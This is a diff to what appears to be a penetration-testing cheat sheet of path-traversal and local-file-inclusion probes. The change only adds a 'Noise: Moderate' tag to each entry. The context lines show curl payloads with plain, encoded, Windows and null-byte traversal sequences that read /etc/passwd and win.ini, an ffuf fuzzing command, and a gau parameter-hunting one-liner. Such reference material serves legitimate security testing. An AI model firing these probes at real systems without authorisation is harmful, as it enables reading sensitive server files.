@@ -10,7 +10,7 @@ Compact traversal and local-file inclusion probes for common parameter patterns.
 curl -sk "https://<TARGET>/<PATH>?file=../../../../etc/passwd"
 ```
 
-**Tool:** curl · **Platform:** Any · **Tags:** Web, traversal, LFI · **Context:** No auth
+**Tool:** curl · **Platform:** Any · **Tags:** Web, traversal, LFI · **Context:** No auth · **Noise:** Moderate
 
 ## Encoded traversal probe
 
@@ -18,7 +18,7 @@ curl -sk "https://<TARGET>/<PATH>?file=../../../../etc/passwd"
 curl -sk "https://<TARGET>/<PATH>?file=..%2f..%2f..%2f..%2fetc%2fpasswd"
 ```
 
-**Tool:** curl · **Platform:** Any · **Tags:** Web, traversal, encoding · **Context:** No auth
+**Tool:** curl · **Platform:** Any · **Tags:** Web, traversal, encoding · **Context:** No auth · **Noise:** Moderate
 
 ## Windows traversal probe
 
@@ -26,7 +26,7 @@ curl -sk "https://<TARGET>/<PATH>?file=..%2f..%2f..%2f..%2fetc%2fpasswd"
 curl -sk "https://<TARGET>/<PATH>?file=..%5c..%5c..%5cWindows%5cwin.ini"
 ```
 
-**Tool:** curl · **Platform:** Any · **Tags:** Web, traversal, Windows · **Context:** No auth
+**Tool:** curl · **Platform:** Any · **Tags:** Web, traversal, Windows · **Context:** No auth · **Noise:** Moderate
 
 ## ffuf traversal payloads
 
@@ -34,7 +34,7 @@ curl -sk "https://<TARGET>/<PATH>?file=..%5c..%5c..%5cWindows%5cwin.ini"
 ffuf -u "https://<TARGET>/<PATH>?file=FUZZ" -w <TRAVERSAL_WORDLIST> -mc all -fs <BASELINE_SIZE>
 ```
 
-**Tool:** ffuf · **Platform:** Linux · **Tags:** Web, traversal, fuzzing · **Context:** No auth
+**Tool:** ffuf · **Platform:** Linux · **Tags:** Web, traversal, fuzzing · **Context:** No auth · **Noise:** Moderate
 
 ## LFI parameter hunting
 
@@ -42,7 +42,7 @@ ffuf -u "https://<TARGET>/<PATH>?file=FUZZ" -w <TRAVERSAL_WORDLIST> -mc all -fs 
 gau <DOMAIN> | grep -Ei "(file|page|path|include|template|document)=" | sort -u
 ```
 
-**Tool:** gau · **Platform:** Linux · **Tags:** Web, LFI, parameters · **Context:** No auth
+**Tool:** gau · **Platform:** Linux · **Tags:** Web, LFI, parameters · **Context:** No auth · **Noise:** Moderate
 
 ## Null-byte legacy probe
 
@@ -50,7 +50,7 @@ gau <DOMAIN> | grep -Ei "(file|page|path|include|template|document)=" | sort -u
 curl -sk "https://<TARGET>/<PATH>?file=../../../../etc/passwd%00"
 ```
 
-**Tool:** curl · **Platform:** Any · **Tags:** Web, LFI, legacy · **Context:** No auth
+**Tool:** curl · **Platform:** Any · **Tags:** Web, LFI, legacy · **Context:** No auth · **Noise:** Moderate
 
 ---
 
